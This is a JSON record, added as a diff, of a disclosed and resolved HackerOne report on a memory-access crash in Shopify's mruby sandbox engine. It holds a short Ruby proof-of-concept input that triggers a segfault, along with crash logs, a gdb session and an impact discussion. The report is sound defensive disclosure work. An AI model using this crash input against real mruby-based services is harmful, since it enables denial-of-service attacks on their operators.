@@ -1,0 +1,135 @@
+{
+  "id": 183231,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODMyMzE=",
+  "url": "https://hackerone.com/reports/183231",
+  "title": "SIGSEGV on mruby mrb_str_modify() (Invalid memory access)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2016-11-18T03:48:21.522Z",
+  "submitted_at": "2016-11-18T03:48:21.522Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jpenalbae",
+    "url": "/jpenalbae",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15668,
+    "url": "https://hackerone.com/shopify-scripts",
+    "handle": "shopify-scripts",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "shopify-scripts",
+      "twitter_handle": "",
+      "website": "",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2016-12-17T02:30:01.984Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-12-17T02:30:01.509Z",
+  "team_member_agreed_on_going_public_at": "2016-12-16T19:57:14.576Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "There is an invalid memory read on mruby when calling to `mrb_str_modify()` with a invalid `RString *` which causes a SIGSEGV and leads to denial of service.\n\n## Sample\n\nThe following code triggers the bug (attached as mrb_str_modify.min.rb):\n```ruby\ndef n\nif $0\nend\n\"\"if 00end\nqqq=Proc.new{|*x|x.join}\nqqq.(\"\",<<000,\"\",\n000\n\"\")\nqqq.(\"\",\"#{<<000}\",\n000\n\"\")\n0[<<0000,\n#{<<0000}\n0000\n0000\n0]\n```\n\n## Crash\nHere we can see the crash (full crash output attached)\n```\n$ bin/sandbox /tmp/mrb_str_modify.min.rb\nbin/sandbox:21: [BUG] Segmentation fault at 0x00000000000001\nruby 2.3.1p112 (2016-04-26) [x86_64-linux-gnu]\n\n-- Control frame information -----------------------------------------------\nc:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval\nc:0002 p:0201 s:0005 E:000518 EVAL   bin/sandbox:21 [FINISH]\nc:0001 p:0000 s:0002 E:000730 (none) [FINISH]\n\n-- Ruby level backtrace information ----------------------------------------\nbin/sandbox:21:in `<main>'\nbin/sandbox:21:in `sandbox_eval'\n\n-- Machine register context ------------------------------------------------\n RIP: 0x00007f423c11d17b RBP: 0x00007f423ac954e0 RSP: 0x00007f423ac93a80\n RAX: 0x0000000000000002 RBX: 0x0000000000000001 RCX: 0x00007f423aca7b00\n RDX: 0x00007f423ac9cf80 RDI: 0x00007f423ac954e0 RSI: 0x0000000000000001\n  R8: 0x00007f423ac953e0  R9: 0x00007f423acbc6a0 R10: 0x0000000000000330\n R11: 0x00007f423c11e670 R12: 0x00007f423ac954e0 R13: 0x00007f423ac9cf80\n R14: 0x00007f423ac954e0 R15: 0x000000000100c03e EFL: 0x0000000000010202\n\n-- C level backtrace information -------------------------------------------\n/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f424042dea5]\n/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f424042e0dc]\n/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f4240308364]\n/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f42403b9dbe]\n/lib/x86_64-linux-gnu/libpthread.so.0 [0x7f424008ced0]\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_str_modify+0xb) [0x7f423c11d17b] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:659\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_str_concat+0x18) [0x7f423c11e688] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:758\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x2243) [0x7f423c12e7d3] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:2219\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x57) [0x7f423c132567] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mruby_engine_monitored_eval+0x113) [0x7f423c106173] ../../../../ext/mruby_engine/eval_monitored.c:68\n/lib/x86_64-linux-gnu/libpthread.so.0 [0x7f4240083464]\n/lib/x86_64-linux-gnu/libc.so.6(__clone+0x6d) [0x7f423f3ff30d]\n```\n\n\n## Crash debug\n\n```\n(gdb) r\nStarting program: /usr/bin/ruby /home/jaime/research/shopy/mruby-engine/bin/sandbox /tmp/mrb_str_modify.min.rb\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\n[New Thread 0x7ffff7ff5700 (LWP 30942)]\n[New Thread 0x7ffff2348700 (LWP 30993)]\n\nProgram received signal SIGSEGV, Segmentation fault.\n[Switching to Thread 0x7ffff2348700 (LWP 30993)]\nmrb_str_modify (mrb=mrb@entry=0x7ffff23494e0, s=s@entry=0x1) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:660\n660       check_frozen(mrb, s);\n(gdb) x/1i $rip\n=> 0x7ffff37d117b <mrb_str_modify+11>:  mov    eax,DWORD PTR [rsi]\n(gdb) i r rsi\nrsi            0x1      1\n(gdb) print (mrb_value)$rsi\n$1 = {\n  value = {\n    p = 0x1,\n    {\n      i_flag = 1,\n      i = 0\n    },\n    {\n      sym_flag = 1,\n      sym = 0\n    },\n    bp = 0x1,\n    fp = 0x1,\n    vp = 0x1\n  },\n  w = 1\n}\n(gdb) list *$rip\n0x7ffff37d117b is in mrb_str_modify (/home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:504).\n499     }\n500\n501     static void\n502     check_frozen(mrb_state *mrb, struct RString *s)\n503     {\n504       if (RSTR_FROZEN_P(s)) {\n505         mrb_raise(mrb, E_RUNTIME_ERROR, \"can't modify frozen string\");\n506       }\n507     }\n508\n(gdb)\n```\n\nBacktrace\n```\n(gdb) bt\n#0  mrb_str_modify (mrb=mrb@entry=0x7ffff23494e0, s=s@entry=0x1) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:660\n#1  0x00007ffff37d2688 in mrb_str_concat (mrb=mrb@entry=0x7ffff23494e0, self=..., other=...) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:758\n#2  0x00007ffff37e27d3 in mrb_vm_exec (mrb=mrb@entry=0x7ffff23494e0, proc=<optimized out>, proc@entry=0x7ffff2351310, pc=<optimized out>) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:2219\n#3  0x00007ffff37e6567 in mrb_vm_run (mrb=0x7ffff23494e0, proc=0x7ffff2351310, self=..., stack_keep=stack_keep@entry=0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n#4  0x00007ffff37ba173 in mruby_engine_monitored_eval (data=0x7ffff23493e0) at ../../../../ext/mruby_engine/eval_monitored.c:68\n#5  0x00007ffff7737464 in start_thread (arg=0x7ffff2348700) at pthread_create.c:333\n#6  0x00007ffff6ab330d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:109\n```\n\nThe crash happens at `mruby-engine/ext/mruby_engine/mruby/src/string.c:504` which is built inline\n```c\nstatic void\ncheck_frozen(mrb_state *mrb, struct RString *s)\n{\n  if (RSTR_FROZEN_P(s)) {   // <-- Bug happens here\n    mrb_raise(mrb, E_RUNTIME_ERROR, \"can't modify frozen string\");\n  }\n}\n```\n\nActually `mrb_str_concat()` performs a cast of the argument `mrb_value self` to a `RString *` pointer, this generates an invalid pointer which is passed to `mrb_str_modify()` and later on to `check_frozen()` which tries to read from it and produces the crash.\n\n## Impact\nIts impact seems to be DoS of the service running the sandbox service. I doubt this would be exploitable, but I have seen the memory address being read change in between samples. If an attacker would be able to control this value it could lead to a write-what-where type vulnerability. But I highly doubt this would be possible to control.\n\nSamples generating different invalid addresses have been attached.\n```\n$ bin/sandbox /tmp/mrb_str_modify.rb 2>&1 | head -1\nbin/sandbox:21: [BUG] Segmentation fault at 0x00000000000003\n$ bin/sandbox /tmp/mrb_str_modify.min.rb 2>&1 | head -1\nbin/sandbox:21: [BUG] Segmentation fault at 0x00000000000001\n```",
+  "weakness": {
+    "id": 48,
+    "name": "Denial of Service"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 135301,
+      "file_name": "mrb_str_modify.min.rb",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/135/301/426e99bb149abb3c39e3ae8b57cf8615a985dc91/mrb_str_modify.min.rb?response-content-disposition=attachment%3B%20filename%3D%22mrb_str_modify.min.rb%22%3B%20filename%2A%3DUTF-8%27%27mrb_str_modify.min.rb&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYNWCPB7L%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T122749Z&X-Amz-Expires=3083&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDbZonlQ6XZgqcJy52%2BgLeu7rc%2BcmnwL48Jd3jP8q5%2FnAIgBqR93Cql4TkH3OcEpzuPURjNMviKVAaN%2BZ5EJ93CKHMqsQUIcBADGgwwMTM2MTkyNzQ4NDkiDC6ruR9Bo4NPZ6hGziqOBTlv9ZKHmz6ju1OkdxDfdYMkEOLdYBFwxFeSW3uoBTkUPGqDZadsGRlOm%2FzVtXFfSNIYP7AeaBzFIeS8LcBh%2BgxgmY5hETW2LeYwB%2F3XW2H67p6e7bnzldnlj2tuACFxnKA6rcmcUQTXn4qVKPw%2FsgBonpbjVSLH1G3MhuwcdUrgeFjI7JHFzHMgd7%2BYjdjZMeFC5A7DM0sT8KjQAqMCvmyYUuytyZlFtZt%2BmkPDyj8xPC2BnGzGd8ViwG0oSBCmgyULo8%2BibDGvrMmOjHPDqqUa51uudsuIw3xXCU7yEl54SJO8XPwko%2FUDfNLlPnB%2BsrExqEFkzOUbRn8wytJZJbdlm4PKX7p1sguljWzLGzMthBAcUaMx563jGqM6UBzNW8J7ZvQGt%2B1a3uE51BbOuuys1pnhOCpDb5JVA%2F%2FnzxJBkW450qNxs7qEyti1abXcL80lTaRmG99RCoVXy4Z1np7gmDfekfXlXCBl86B94t2Ng9rjTnc7plMi%2BnjT5NpYRtvlD1UpwqSlpHw2LxzvZHpnEAjgW8aVgyKPoE6tQwMw2sgb02Lt0IOaTIVI9DmdZbb5FIIz5u0W7gGoxWgQ5yaRk5osuY5nK4GSs4uwAAb6e9hPfxePBU%2B3OK%2BLDM2L0ULVBqQLonfTFD4q0hygJNmtMZ93jUiC1uw5seAKU9RQaFXprCUTfTFtdiGuqhtRvHnqNI2%2BYtGwEaoPk45%2FBZHKWdUiA6zzx2Vh1ViwuP2bYU1TfleKuf4XSDTRnsL25sxpXHdWEdzp36j4m8m4N7y9V%2BDLGJL0W5laKN4XaBIRNCwRfNALochyxg%2FRqoYPvilO9klb%2Fo58doCSMcQFz%2B2dImB8vsUlC4TfkCpPPjC7payuBjqxAUz7jVGh5dF5HDYPCV1aK6vLNtHQn48iZT2lveCprzWjOASVNejwySv8S0Qz3%2BorxxSB4hGPZkqz36geF8d9lQ8aLh18bVe6qUL5yM5i2yxVkHovo80Uf9FwD0IrvwxhBv2vzB%2BEuch1dctBkoyLtJS470n%2BuD%2F%2BwCLVUXoH1ljlX3lPqEb2nvs0Eo4v6pGR4x8y4bHoxAxkfJRPNJ4ut4mAE9vidBtOStAITUN8HDLywA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=95f9f9ccd00225457e7a307f3b0eb31bb73a8154c83329454d0048c3e23d862f",
+      "file_size": 139,
+      "type": "text/plain",
+      "moderated": null
+    },
+    {
+      "id": 135302,
+      "file_name": "mrb_str_modify.rb",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/135/302/e13bada5b99bb47127ce9674abc6822babbf62d8/mrb_str_modify.rb?response-content-disposition=attachment%3B%20filename%3D%22mrb_str_modify.rb%22%3B%20filename%2A%3DUTF-8%27%27mrb_str_modify.rb&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYNWCPB7L%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T122749Z&X-Amz-Expires=3083&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDbZonlQ6XZgqcJy52%2BgLeu7rc%2BcmnwL48Jd3jP8q5%2FnAIgBqR93Cql4TkH3OcEpzuPURjNMviKVAaN%2BZ5EJ93CKHMqsQUIcBADGgwwMTM2MTkyNzQ4NDkiDC6ruR9Bo4NPZ6hGziqOBTlv9ZKHmz6ju1OkdxDfdYMkEOLdYBFwxFeSW3uoBTkUPGqDZadsGRlOm%2FzVtXFfSNIYP7AeaBzFIeS8LcBh%2BgxgmY5hETW2LeYwB%2F3XW2H67p6e7bnzldnlj2tuACFxnKA6rcmcUQTXn4qVKPw%2FsgBonpbjVSLH1G3MhuwcdUrgeFjI7JHFzHMgd7%2BYjdjZMeFC5A7DM0sT8KjQAqMCvmyYUuytyZlFtZt%2BmkPDyj8xPC2BnGzGd8ViwG0oSBCmgyULo8%2BibDGvrMmOjHPDqqUa51uudsuIw3xXCU7yEl54SJO8XPwko%2FUDfNLlPnB%2BsrExqEFkzOUbRn8wytJZJbdlm4PKX7p1sguljWzLGzMthBAcUaMx563jGqM6UBzNW8J7ZvQGt%2B1a3uE51BbOuuys1pnhOCpDb5JVA%2F%2FnzxJBkW450qNxs7qEyti1abXcL80lTaRmG99RCoVXy4Z1np7gmDfekfXlXCBl86B94t2Ng9rjTnc7plMi%2BnjT5NpYRtvlD1UpwqSlpHw2LxzvZHpnEAjgW8aVgyKPoE6tQwMw2sgb02Lt0IOaTIVI9DmdZbb5FIIz5u0W7gGoxWgQ5yaRk5osuY5nK4GSs4uwAAb6e9hPfxePBU%2B3OK%2BLDM2L0ULVBqQLonfTFD4q0hygJNmtMZ93jUiC1uw5seAKU9RQaFXprCUTfTFtdiGuqhtRvHnqNI2%2BYtGwEaoPk45%2FBZHKWdUiA6zzx2Vh1ViwuP2bYU1TfleKuf4XSDTRnsL25sxpXHdWEdzp36j4m8m4N7y9V%2BDLGJL0W5laKN4XaBIRNCwRfNALochyxg%2FRqoYPvilO9klb%2Fo58doCSMcQFz%2B2dImB8vsUlC4TfkCpPPjC7payuBjqxAUz7jVGh5dF5HDYPCV1aK6vLNtHQn48iZT2lveCprzWjOASVNejwySv8S0Qz3%2BorxxSB4hGPZkqz36geF8d9lQ8aLh18bVe6qUL5yM5i2yxVkHovo80Uf9FwD0IrvwxhBv2vzB%2BEuch1dctBkoyLtJS470n%2BuD%2F%2BwCLVUXoH1ljlX3lPqEb2nvs0Eo4v6pGR4x8y4bHoxAxkfJRPNJ4ut4mAE9vidBtOStAITUN8HDLywA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2415485a95c60eeb9f22135df6215d431dc02d466abd76a9977dd219b9572fa9",
+      "file_size": 4703,
+      "type": "application/octet-stream",
+      "moderated": null
+    },
+    {
+      "id": 135304,
+      "file_name": "mrb_str_modify.crash.log",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/135/304/227543e55a0f26a079b00e9477a3b16a8e78e206/mrb_str_modify.crash.log?response-content-disposition=attachment%3B%20filename%3D%22mrb_str_modify.crash.log%22%3B%20filename%2A%3DUTF-8%27%27mrb_str_modify.crash.log&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYNWCPB7L%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T122749Z&X-Amz-Expires=3083&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDbZonlQ6XZgqcJy52%2BgLeu7rc%2BcmnwL48Jd3jP8q5%2FnAIgBqR93Cql4TkH3OcEpzuPURjNMviKVAaN%2BZ5EJ93CKHMqsQUIcBADGgwwMTM2MTkyNzQ4NDkiDC6ruR9Bo4NPZ6hGziqOBTlv9ZKHmz6ju1OkdxDfdYMkEOLdYBFwxFeSW3uoBTkUPGqDZadsGRlOm%2FzVtXFfSNIYP7AeaBzFIeS8LcBh%2BgxgmY5hETW2LeYwB%2F3XW2H67p6e7bnzldnlj2tuACFxnKA6rcmcUQTXn4qVKPw%2FsgBonpbjVSLH1G3MhuwcdUrgeFjI7JHFzHMgd7%2BYjdjZMeFC5A7DM0sT8KjQAqMCvmyYUuytyZlFtZt%2BmkPDyj8xPC2BnGzGd8ViwG0oSBCmgyULo8%2BibDGvrMmOjHPDqqUa51uudsuIw3xXCU7yEl54SJO8XPwko%2FUDfNLlPnB%2BsrExqEFkzOUbRn8wytJZJbdlm4PKX7p1sguljWzLGzMthBAcUaMx563jGqM6UBzNW8J7ZvQGt%2B1a3uE51BbOuuys1pnhOCpDb5JVA%2F%2FnzxJBkW450qNxs7qEyti1abXcL80lTaRmG99RCoVXy4Z1np7gmDfekfXlXCBl86B94t2Ng9rjTnc7plMi%2BnjT5NpYRtvlD1UpwqSlpHw2LxzvZHpnEAjgW8aVgyKPoE6tQwMw2sgb02Lt0IOaTIVI9DmdZbb5FIIz5u0W7gGoxWgQ5yaRk5osuY5nK4GSs4uwAAb6e9hPfxePBU%2B3OK%2BLDM2L0ULVBqQLonfTFD4q0hygJNmtMZ93jUiC1uw5seAKU9RQaFXprCUTfTFtdiGuqhtRvHnqNI2%2BYtGwEaoPk45%2FBZHKWdUiA6zzx2Vh1ViwuP2bYU1TfleKuf4XSDTRnsL25sxpXHdWEdzp36j4m8m4N7y9V%2BDLGJL0W5laKN4XaBIRNCwRfNALochyxg%2FRqoYPvilO9klb%2Fo58doCSMcQFz%2B2dImB8vsUlC4TfkCpPPjC7payuBjqxAUz7jVGh5dF5HDYPCV1aK6vLNtHQn48iZT2lveCprzWjOASVNejwySv8S0Qz3%2BorxxSB4hGPZkqz36geF8d9lQ8aLh18bVe6qUL5yM5i2yxVkHovo80Uf9FwD0IrvwxhBv2vzB%2BEuch1dctBkoyLtJS470n%2BuD%2F%2BwCLVUXoH1ljlX3lPqEb2nvs0Eo4v6pGR4x8y4bHoxAxkfJRPNJ4ut4mAE9vidBtOStAITUN8HDLywA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=671789710b450c2345ba4ad019fc11e38ab1028524b8b4177c8c1bf1e302f5f5",
+      "file_size": 32591,
+      "type": "text/plain",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-01-15T19:57:14.607Z",
+  "allow_singular_disclosure_after": -223317034.78283286,
+  "singular_disclosure_allowed": true,
+  "vote_count": 5,
+  "voters": [
+    "mpz",
+    "eveeez",
+    "spetr0x",
+    "scept1c",
+    "hackerjuan"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
